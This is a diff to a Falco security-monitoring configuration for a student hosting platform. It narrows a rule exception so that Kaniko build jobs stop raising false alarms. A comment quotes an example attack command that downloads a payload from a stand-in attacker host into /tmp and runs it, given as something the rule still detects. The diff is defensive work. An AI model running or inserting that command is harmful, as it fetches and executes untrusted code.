@@ -40,21 +40,37 @@ falcosidekick:
 
 # --- Custom rule exception: build-job false positive on "Drop and execute
 # --- new binary in container" (priority Critical, would hit AUTO_ACTION).
-# --- Every Node.js build job installs deps at runtime (npm install writes
-# --- node_modules/.bin/next etc. into the writable layer, then executes it)
-# --- — this is normal, unavoidable build behavior, not an attack, and fires
-# --- on every single student Next.js build without this exception.
 # ---
-# --- Deliberately narrow: only exempts recognized build-tool process names
-# --- running from known build-tool paths, NOT the whole builder image —
-# --- keeps detection alive for a genuinely unexpected binary (e.g. a
-# --- reverse shell hidden in a malicious postinstall script) dropped
-# --- anywhere else inside the same build job. Extend the proc.name list as
-# --- you add more build tool support (python/pip, go, cargo, etc.) in
-# --- builder-config/Dockerfile.
+# --- ROOT CAUSE (structural, not tool-specific): Kaniko doesn't run nested
+# --- containers per build stage — it unpacks the student's `FROM` base
+# --- image (node:20, python:3.12, whatever) directly into this pod's own
+# --- filesystem and executes RUN commands there. Falco's frame of reference
+# --- is still "this pod's registered image is paas-builders/builder-image",
+# --- so ANY runtime binary pulled in via the student's Dockerfile — node,
+# --- python, a compiled Go binary, anything — looks identical to a dropped
+# --- implant. This is not specific to Node/npm; it fires for every
+# --- language a student's Dockerfile might use, since the mechanism is
+# --- Kaniko's build architecture itself, not any one build tool.
+# ---
+# --- Scoped to build-job pods only (container.name="paas-builder", pod name
+# --- containing "-build-job-", matching deploy_utils' actual naming), so
+# --- live app pods are NOT covered by this exception — a real dropped
+# --- binary in a running student app still fires at full severity.
+# ---
+# --- Still narrowed by path, on purpose: only exempts binaries under normal
+# --- install locations (package manager bin dirs, /usr/*, /opt/*), NOT
+# --- scratch directories like /tmp or /dev/shm — a malicious postinstall
+# --- script doing `curl attacker.com/payload -o /tmp/x && /tmp/x` still
+# --- trips this rule, since /tmp isn't a legitimate install path for any
+# --- language's package manager.
 customRules:
   rules-buet-paas-exceptions.yaml: |-
     - macro: known_drop_and_execute_activities
       condition: >
-        (proc.name in (npm, npx, next, node, yarn, pnpm, tsc, webpack, vite)
-         and proc.exepath startswith /app/node_modules/.bin/)
+        (container.name = "paas-builder"
+         and k8s.pod.name contains "-build-job-"
+         and (proc.exepath startswith /usr/
+              or proc.exepath startswith /opt/
+              or proc.exepath contains "/node_modules/.bin/"
+              or proc.exepath contains "/.local/bin/"
+              or proc.exepath contains "/go/bin/"))
